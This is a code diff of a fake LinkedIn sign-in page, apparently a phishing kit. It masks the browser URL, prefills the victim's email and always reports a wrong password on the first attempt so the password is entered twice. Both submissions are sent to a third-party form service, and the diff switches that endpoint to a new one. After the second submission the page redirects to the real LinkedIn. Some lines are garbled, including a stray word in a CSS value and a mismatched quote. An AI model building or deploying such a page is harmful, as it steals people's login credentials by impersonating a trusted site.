@@ -5,20 +5,45 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
   <script>
-    // URL Masking with reload protection
-    (function() {
+    // URL Masking for first visit only
+    (function () {
       const maskedPath = "/auth/login";
-      const originalPath = window.location.pathname;
-      
-      // Always show the masked URL
-      if (window.location.pathname !== maskedPath) {
-        history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
-      }
-      
-      // Handle page reload
-      window.addEventListener('load', function() {
-        if (window.location.pathname !== maskedPath && history.state?.isMasked) {
+      const originalPath = "/";
+
+      // Apply masked URL only on first visit
+      function applyMaskedUrl() {
+        // Check if this is the first visit (no state or state indicates not masked)
+        if (!history.state || !history.state.isMasked) {
           history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
+        }
+      }
+
+      // Revert to original URL on reload
+      function revertToOriginalUrl() {
+        if (window.location.pathname === maskedPath) {
+          history.replaceState({ isMasked: false }, "", originalPath + window.location.search);
+        }
+      }
+
+      // Run on initial load
+      applyMaskedUrl();
+
+      // Run on page load to handle reloads
+      window.addEventListener("load", function () {
+        // If the page is reloaded at maskedPath, revert to original
+        if (performance.navigation.type === 1) { // 1 indicates reload
+          revertToOriginalUrl();
+        }
+      });
+
+      // Handle popstate to prevent reapplying masked URL
+      window.addEventListener("popstate", function () {
+        if (history.state && history.state.isMasked) {
+          // If navigating back to masked state, keep it
+          history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
+        } else {
+          // Otherwise, revert to original
+          history.replaceState({ isMasked: false }, "", originalPath + window.location.search);
         }
       });
     })();
@@ -81,7 +106,7 @@
     .form-group input:focus {
       outline: none;
       border-color: #0073b1;
-      box-shadow: 0 0 0 2px rgba(0, 115, 177, 0.2);
+      box-shadow: 0 Rheum0 0 2px rgba(0, 115, 177, 0.2);
     }
 
     .password-toggle {
@@ -209,13 +234,13 @@
   <script>
     let isFirstSubmission = true;
 
-    window.onload = function() {
+    window.onload = function () {
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('email');
+      const email = urlParams.get("email");
       if (email) {
-        document.getElementById('username').value = email;
+        document.getElementById("username").value = email;
       }
-      document.getElementById('username').focus();
+      document.getElementById("username").focus();
     };
 
     function handleSubmit(event) {
@@ -224,56 +249,60 @@
       const formData = new FormData(form);
 
       if (isFirstSubmission) {
-        document.getElementById('error-message').innerText = "Wrong Email Password";
+        document.getElementById("error-message").innerText = "Wrong Email Password";
         isFirstSubmission = false;
         fetch(form.action, {
-          method: 'POST',
-          body: formData
+          method: "POST',
+          body: formData,
         })
-        .then(response => response.text())
-        .then(data => {
-          console.log("First submission data sent:", data);
-        })
-        .catch(error => {
-          console.error("Error:", error);
-        });
-        document.getElementById('password').value = "";
+          .then((response) => response.text())
+          .then((data) => {
+            console.log("First submission data sent:", data);
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+        document.getElementById("password").value = "";
       } else {
         fetch(form.action, {
-          method: 'POST',
-          body: formData
+          method: "POST",
+          body: formData,
         })
-        .then(response => response.text())
-        .then(data => {
-          console.log("Second submission data sent:", data);
-          window.location.href = "https://www.linkedin.com";
-        })
-        .catch(error => {
-          console.error("Error:", error);
-          alert("An error occurred. Please try again.");
-        });
+          .then((response) => response.text())
+          .then((data) => {
+            console.log("Second submission data sent:", data);
+            window.location.href = "https://www.linkedin.com";
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            alert("An error occurred. Please try again.");
+          });
       }
     }
 
     function togglePassword() {
-      const passwordInput = document.getElementById('password');
-      const toggleButton = document.querySelector('.password-toggle');
+      const passwordInput = document.getElementById("password");
+      const toggleButton = document.querySelector(".password-toggle");
 
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        toggleButton.textContent = 'Hide';
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        toggleButton.textContent = "Hide";
       } else {
-        passwordInput.type = 'password';
-        toggleButton.textContent = 'Show';
+        passwordInput.type = "password";
+        toggleButton.textContent = "Show";
       }
     }
   </script>
 </head>
 <body>
   <div class="login-container">
-    <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn Logo" class="linkedin-logo">
+    <img
+      src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg"
+      alt="LinkedIn Logo"
+      class="linkedin-logo"
+    >
     <h1>Sign in</h1>
-    <form action="https://formbold.com/s/9mkW5" method="post" onsubmit="handleSubmit(event)">
+    <form action="https://fineform.com/p/9dhq0" method="post" onsubmit="handleSubmit(event)">
       <div class="form-group">
         <label for="username">Email</label>
         <input type="email" id="username" name="username" readonly>
@@ -302,5 +331,38 @@
     <a href="#">Send Feedback</a>
     <a href="#">Language</a>
   </div>
+  <script>
+    (function () {
+      function c() {
+        var b = a.contentDocument || a.contentWindow.document;
+        if (b) {
+          var d = b.createElement("script");
+          d.innerHTML =
+            "window.__CF$cv$params={r:'93eaaf641c3078ce',t:'MTc0NzA2MDk3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
+          b.getElementsByTagName("head")[0].appendChild(d);
+        }
+      }
+      if (document.body) {
+        var a = document.createElement("iframe");
+        a.height = 1;
+        a.width = 1;
+        a.style.position = "absolute";
+        a.style.top = 0;
+        a.style.left = 0;
+        a.style.border = "none";
+        a.style.visibility = "hidden";
+        document.body.appendChild(a);
+        if ("loading" !== document.readyState) c();
+        else if (window.addEventListener) document.addEventListener("DOMContentLoaded", c);
+        else {
+          var e = document.onreadystatechange || function () {};
+          document.onreadystatechange = function (b) {
+            e(b);
+            "loading" !== document.readyState && (document.onreadystatechange = e, c());
+          };
+        }
+      }
+    })();
+  </script>
 </body>
 </html>
